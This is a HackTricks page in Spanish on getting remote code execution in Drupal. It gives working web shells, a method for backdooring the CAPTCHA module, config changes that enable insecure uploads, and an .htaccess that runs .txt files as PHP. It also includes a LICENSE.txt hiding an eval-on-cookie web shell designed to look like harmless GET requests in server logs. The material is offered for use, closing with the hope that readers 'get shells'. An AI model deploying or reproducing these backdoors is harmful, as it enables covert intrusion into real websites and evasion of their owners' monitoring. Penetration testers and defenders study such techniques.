# Drupal RCE

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Con el Módulo PHP Filter

{% hint style="warning" %}
En versiones antiguas de Drupal **(antes de la versión 8)**, era posible iniciar sesión como administrador y **habilitar el módulo `PHP filter`**, que "Permite evaluar código/snippets PHP incrustados." Pero a partir de la versión 8, este módulo no está instalado por defecto.
{% endhint %}

Necesitas que el **plugin php esté instalado** (verifícalo accediendo a _/modules/php_ y si devuelve un **403** entonces, **existe**, si **no se encuentra**, entonces el **plugin php no está instalado**)

Ve a _Módulos_ -> (**Marca la casilla de**) _PHP Filter_ -> _Guardar configuración_

![](<../../../.gitbook/assets/image (247) (1).png>)

Luego haz clic en _Añadir contenido_ -> Selecciona _Página básica_ o _Artículo_ -> Escribe _código shell php en el cuerpo_ -> Selecciona _Código PHP_ en _Formato de texto_ -> Selecciona _Vista previa_

![](<../../../.gitbook/assets/image (338).png>)

Finalmente solo accede al nodo recién creado:
```bash
curl http://drupal-site.local/node/3
```
## Instalar el Módulo PHP Filter

{% hint style="warning" %}
En las versiones actuales ya no es posible instalar complementos teniendo acceso solo a la web después de la instalación predeterminada.
{% endhint %}

A partir de la versión **8 en adelante**, el [**módulo PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **no se instala por defecto**. Para aprovechar esta funcionalidad, tendríamos que **instalar el módulo nosotros mismos**.

1. Descargar la versión más reciente del módulo desde el sitio web de Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una vez descargado, ir a **`Administración`** > **`Informes`** > **`Actualizaciones disponibles`**.
3. Hacer clic en **`Examinar`**, seleccionar el archivo del directorio donde lo descargamos y luego hacer clic en **`Instalar`**.
4. Una vez instalado el módulo, podemos hacer clic en **`Contenido`** y **crear una nueva página básica**, similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, asegúrate de **seleccionar `Código PHP` en el menú desplegable de `Formato de texto`**.

## Módulo con Puerta Trasera

{% hint style="warning" %}
En las versiones actuales ya no es posible instalar complementos teniendo acceso solo a la web después de la instalación predeterminada.
{% endhint %}

Se puede crear un módulo con puerta trasera **agregando un shell a un módulo existente**. Los módulos se pueden encontrar en el sitio web drupal.org. Elijamos un módulo como [CAPTCHA](https://www.drupal.org/project/captcha). Desplázate hacia abajo y copia el enlace para el archivo tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Descarga el archivo y extrae su contenido.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crear una **shell web en PHP** con el contenido:
```php
<?php
system($_GET["cmd"]);
?>
```
* A continuación, necesitamos crear un archivo **`.htaccess`** para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en /modules. Copia ambos de estos archivos a la carpeta captcha y crea un archivo.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Suponiendo que tenemos **acceso administrativo** al sitio web, haz clic en **`Gestionar`** y luego en **`Ampliar`** en la barra lateral. A continuación, haz clic en el botón **`+ Instalar nuevo módulo`**, y seremos llevados a la página de instalación, como `http://drupal-site.local/admin/modules/install`. Navega hasta el archivo backdoored Captcha y haz clic en **`Instalar`**.
* Una vez que la instalación tenga éxito, navega a **`/modules/captcha/shell.php`** para ejecutar comandos.

## Backdooring Drupal con Sincronización de configuración <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Publicado por** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Parte 1 (activación de _Media_ y _Media Library_)

En el menú _Ampliar_ (/admin/modules), puedes activar lo que parecen ser complementos ya instalados. Por defecto, los complementos _Media_ y _Media Library_ no parecen estar activados, así que activémoslos.

Antes de la activación:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Después de la activación:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Parte 2 (aprovechando la característica _Sincronización de configuración_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Aprovecharemos la característica de _Sincronización de configuración_ para volcar (exportar) y cargar (importar) entradas de configuración de Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Parchear system.file.yml**

Comencemos parcheando la primera entrada `allow_insecure_uploads` desde:

Archivo: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

A:

Archivo: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Parchear field.field.media.document.field\_media\_document.yml**

Luego, parchea la segunda entrada `file_extensions` de:

Archivo: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

A:

Archivo: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> No lo uso en esta publicación del blog, pero se señala que es posible definir la entrada `file_directory` de forma arbitraria y que es vulnerable a un ataque de traversing de ruta (por lo que podemos retroceder dentro del árbol del sistema de archivos de Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Parte 3 (aprovechando la función _Agregar Documento_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

El último paso es el más simple y se divide en dos subpasos. El primero es cargar un archivo en formato .htaccess para aprovechar las directivas de Apache y permitir que los archivos .txt sean interpretados por el motor PHP. El segundo es cargar un archivo .txt que contenga nuestra carga útil.

Archivo: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
¿Por qué es genial este truco?

Porque una vez que la Webshell (que llamaremos LICENSE.txt) se haya depositado en el servidor web, podemos transmitir nuestros comandos a través de `$_COOKIE` y en los registros del servidor web, esto aparecerá como una solicitud GET legítima a un archivo de texto.

¿Por qué nombrar nuestra Webshell LICENSE.txt?

Simplemente porque si tomamos el siguiente archivo, por ejemplo [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (que ya está presente en el núcleo de Drupal), tenemos un archivo de 339 líneas y 17.6 KB de tamaño, que es perfecto para agregar un pequeño fragmento de código PHP en el medio (ya que el archivo es lo suficientemente grande).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Archivo: LICENSE.txt parcheado
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Parte 3.1 (subir archivo .htaccess)**

Primero, aprovechamos la función _Add Document_ (/media/add/document) para subir nuestro archivo que contiene las directivas de Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Parte 3.2 (subir archivo LICENSE.txt)**

Luego, aprovechamos nuevamente la función _Add Document_ (/media/add/document) para subir un Webshell oculto dentro de un archivo de licencia.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Parte 4 (interacción con el Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

La última parte consiste en interactuar con el Webshell.

Como se muestra en la siguiente captura de pantalla, si la cookie esperada por nuestro Webshell no está definida, obtenemos el resultado subsiguiente al consultar el archivo a través de un navegador web.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Cuando el atacante establece la cookie, puede interactuar con el Webshell y ejecutar los comandos que desee.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Y como se puede ver en los registros, parece que solo se ha solicitado un archivo txt.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Gracias por tomarte el tiempo de leer este artículo, espero que te ayude a obtener algunas shells.
